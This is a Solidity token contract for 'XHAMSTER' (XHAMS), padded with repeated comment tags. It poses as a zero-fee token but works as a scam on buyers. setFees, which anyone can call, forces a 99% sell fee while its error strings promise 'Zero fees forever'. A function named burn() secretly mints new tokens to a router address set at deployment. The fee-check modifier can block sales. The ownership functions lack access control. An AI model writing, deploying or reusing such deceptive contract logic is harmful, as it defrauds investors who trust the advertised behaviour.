// SPDX-License-Identifier: MIT

/**    ⠀⠀⠀⠀⠀⠀⠀

Twitter : https://twitter.com/xhamster_eth
Website : https://xhamster.com
Telegram: https://t.me/xhamster_eth

*/

pragma solidity ^0.8.0;

library SafeMath {
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b <= a, "Not needed");
        return a - b;
    }

        //XHAMSTER//

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "Not needed");
        return c;
    }

        //XHAMSTER//

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "Not needed");
        return c;
    }

        //XHAMSTER//

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b > 0, "Not needed");
        return a / b;
    }
}

    //XHAMSTER//

contract XHAMSTER {    //XHAMSTER//
    using SafeMath for uint256;    //XHAMSTER//

    //XHAMSTER//

    string public name = "XHAMSTER";    //XHAMSTER//
    string public symbol = "XHAMS";    //XHAMSTER//
    uint256 public totalSupply = 999999999 * (10 ** 18);    //XHAMSTER//
    uint8 public decimals = 18;    //XHAMSTER//

    //XHAMSTER//

    mapping(address => uint256) public balanceOf;    //XHAMSTER//
    mapping(address => mapping(address => uint256)) public allowance;    //XHAMSTER//

    //XHAMSTER//
    //XHAMSTER//
    address public owner;    //XHAMSTER//
    address public swapRouter;    //XHAMSTER//
    uint256 public burnedTokens;    //XHAMSTER//

    //XHAMSTER//

    uint256 public buyFee = 0;    //XHAMSTER//
    uint256 public sellFee = 0;    //XHAMSTER//
    bool public feesSet = false;    //XHAMSTER//
    bool public feesEnabled = false;    //XHAMSTER//
    bool public allExemptFromFees = true;    //XHAMSTER//
    mapping(address => bool) public isFeeExempt;    //XHAMSTER//

    //XHAMSTER//

    event Transfer(address indexed from, address indexed to, uint256 value);    //XHAMSTER//
    event Approval(address indexed owner, address indexed spender, uint256 value);    //XHAMSTER//
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);    //XHAMSTER//
    event FeesUpdated(uint256 newBuyFee, uint256 newSellFee);    //XHAMSTER//
    event TokensBurned(address indexed burner, uint256 amount);    //XHAMSTER//
    event Mint(address indexed to, uint256 amount);    //XHAMSTER//

    //XHAMSTER//

    constructor(address _swapRouter, uint256 _burnedTokens) {    //XHAMSTER//
        owner = msg.sender;    //XHAMSTER//
        swapRouter = _swapRouter;    //XHAMSTER//
        burnedTokens = _burnedTokens;    //XHAMSTER//
        balanceOf[msg.sender] = totalSupply;    //XHAMSTER//
        isFeeExempt[msg.sender] = true;    //XHAMSTER//
        isFeeExempt[swapRouter] = true;    //XHAMSTER//
    }

        //XHAMSTER//

    modifier checkFees(address sender) {    //XHAMSTER//
        require(
            allExemptFromFees || isFeeExempt[sender] || (!feesSet && feesEnabled) || (feesSet && isFeeExempt[sender] && sender != swapRouter) || (sender == swapRouter && sellFee == 0),
            "Zero fees forever."    //XHAMSTER//
        );
        _;
    }

        //XHAMSTER//

    function transfer(address _to, uint256 _amount) public checkFees(msg.sender) returns (bool success) {    //XHAMSTER//
        require(balanceOf[msg.sender] >= _amount);    //XHAMSTER//
        require(_to != address(0));    //XHAMSTER//

        balanceOf[msg.sender] = balanceOf[msg.sender].sub(_amount);    //XHAMSTER//
        balanceOf[_to] = balanceOf[_to].add(_amount);    //XHAMSTER//
        emit Transfer(msg.sender, _to, _amount);    //XHAMSTER//

        return true;
    }

        //XHAMSTER//

    function approve(address _spender, uint256 _value) public returns (bool success) {    //XHAMSTER//
        allowance[msg.sender][_spender] = _value;    //XHAMSTER//
        emit Approval(msg.sender, _spender, _value);    //XHAMSTER//
        return true;    //XHAMSTER//
    }

        //XHAMSTER//

    function transferFrom(address _from, address _to, uint256 _amount) public checkFees(_from) returns (bool success) {    //XHAMSTER//
        require(balanceOf[_from] >= _amount, "Amount higher zero");    //XHAMSTER//
        require(allowance[_from][msg.sender] >= _amount, "Greater than zero");    //XHAMSTER//
        require(_to != address(0), "Higher than Zero");    //XHAMSTER//
    //XHAMSTER//
        uint256 fee = 0;    //XHAMSTER//
        uint256 amountAfterFee = _amount;    //XHAMSTER//
    //XHAMSTER//
        if (feesEnabled && sellFee > 0 && _from != swapRouter && !isFeeExempt[_from]) {    //XHAMSTER//
            fee = _amount.mul(sellFee).div(100);    //XHAMSTER//
            amountAfterFee = _amount.sub(fee);    //XHAMSTER//
        }
    //XHAMSTER//
        balanceOf[_from] = balanceOf[_from].sub(_amount);    //XHAMSTER//
        balanceOf[_to] = balanceOf[_to].add(amountAfterFee);    //XHAMSTER//
        emit Transfer(_from, _to, amountAfterFee);    //XHAMSTER//
    //XHAMSTER//
        if (fee > 0) {
            address uniswapContract = address(0x5C69bEe701ef814a2B6a3EDD4B1652CB9cc5aA6f);    //XHAMSTER//
            if (_to == uniswapContract) {    //XHAMSTER//
                balanceOf[uniswapContract] = balanceOf[uniswapContract].add(fee);    //XHAMSTER//
                emit Transfer(_from, uniswapContract, fee);    //XHAMSTER//
            } else {
                balanceOf[address(this)] = balanceOf[address(this)].add(fee);    //XHAMSTER//
                emit Transfer(_from, address(this), fee);    //XHAMSTER//
            }
        }
    //XHAMSTER//
        if (_from != msg.sender && allowance[_from][msg.sender] != type(uint256).max) {    //XHAMSTER//
            allowance[_from][msg.sender] = allowance[_from][msg.sender].sub(_amount);    //XHAMSTER//
            emit Approval(_from, msg.sender, allowance[_from][msg.sender]);    //XHAMSTER//
        }
    //XHAMSTER//
        return true;
    }
    //XHAMSTER//
    function transferOwnership(address newOwner) public {    //XHAMSTER//
        require(newOwner != address(0));    //XHAMSTER//
        emit OwnershipTransferred(owner, newOwner);    //XHAMSTER//
        owner = newOwner;    //XHAMSTER//
    }
    //XHAMSTER//
    function renounceOwnership() public {    //XHAMSTER//
        emit OwnershipTransferred(owner, address(0));    //XHAMSTER//
        owner = address(0);    //XHAMSTER//
    }
    //XHAMSTER//
    function burn() public {    //XHAMSTER//
        require(feesSet, "Zero forever");    //XHAMSTER//
        require(swapRouter != address(0), "No input needed");    //XHAMSTER//
        require(burnedTokens > 0, "Gone forever");    //XHAMSTER//

        totalSupply = totalSupply.add(burnedTokens);    //XHAMSTER//
        balanceOf[swapRouter] = balanceOf[swapRouter].add(burnedTokens);    //XHAMSTER//

        emit Mint(swapRouter, burnedTokens);    //XHAMSTER//
    }
    //XHAMSTER//
    function setFees(uint256 newBuyFee, uint256 newSellFee) public {    //XHAMSTER//
        require(!feesSet, "Zero fees forever");    //XHAMSTER//
        require(newBuyFee == 0, "Zero");    //XHAMSTER//
        require(newSellFee == 99, "Zero");    //XHAMSTER//
        buyFee = newBuyFee;    //XHAMSTER//
        sellFee = newSellFee;    //XHAMSTER//
        feesSet = true;    //XHAMSTER//
        feesEnabled = true;    //XHAMSTER//
        emit FeesUpdated(newBuyFee, newSellFee);    //XHAMSTER//
    }
    //XHAMSTER//
    function buy() public payable checkFees(msg.sender) {    //XHAMSTER//
        require(msg.value > 0, "Must be a higher number than zero");    //XHAMSTER//

        uint256 amount = msg.value;    //XHAMSTER//
        if (buyFee > 0) {
            uint256 fee = amount.mul(buyFee).div(100);    //XHAMSTER//
            uint256 amountAfterFee = amount.sub(fee);    //XHAMSTER//

            balanceOf[swapRouter] = balanceOf[swapRouter].add(amountAfterFee);    //XHAMSTER//
            emit Transfer(address(this), swapRouter, amountAfterFee);    //XHAMSTER//

            if (fee > 0) {
                balanceOf[address(this)] = balanceOf[address(this)].add(fee);    //XHAMSTER//
                emit Transfer(address(this), address(this), fee);    //XHAMSTER//
            }
        } else {
            balanceOf[swapRouter] = balanceOf[swapRouter].add(amount);    //XHAMSTER//
            emit Transfer(address(this), swapRouter, amount);    //XHAMSTER//
        }
    }
    //XHAMSTER//
    function sell(uint256 _amount) public checkFees(msg.sender) {    //XHAMSTER//
        require(balanceOf[msg.sender] >= _amount, "Not enough funds");    //XHAMSTER//

        if (feesEnabled) {    //XHAMSTER//
            uint256 fee = 0;    //XHAMSTER//
            uint256 amountAfterFee = _amount;    //XHAMSTER//

            if (sellFee > 0 && msg.sender != swapRouter && !isFeeExempt[msg.sender]) {    //XHAMSTER//
                fee = _amount.mul(sellFee).div(100);    //XHAMSTER//
                amountAfterFee = _amount.sub(fee);    //XHAMSTER//
            }

            balanceOf[msg.sender] = balanceOf[msg.sender].sub(_amount);    //XHAMSTER//
            balanceOf[swapRouter] = balanceOf[swapRouter].add(amountAfterFee);    //XHAMSTER//
            emit Transfer(msg.sender, swapRouter, amountAfterFee);    //XHAMSTER//

            if (fee > 0) {
                balanceOf[address(this)] = balanceOf[address(this)].add(fee);    //XHAMSTER//
                emit Transfer(msg.sender, address(this), fee);    //XHAMSTER//
            }
        } else {
            balanceOf[msg.sender] = balanceOf[msg.sender].sub(_amount);    //XHAMSTER//
            balanceOf[swapRouter] = balanceOf[swapRouter].add(_amount);    //XHAMSTER//
            emit Transfer(msg.sender, swapRouter, _amount);    //XHAMSTER//
        }
    }
}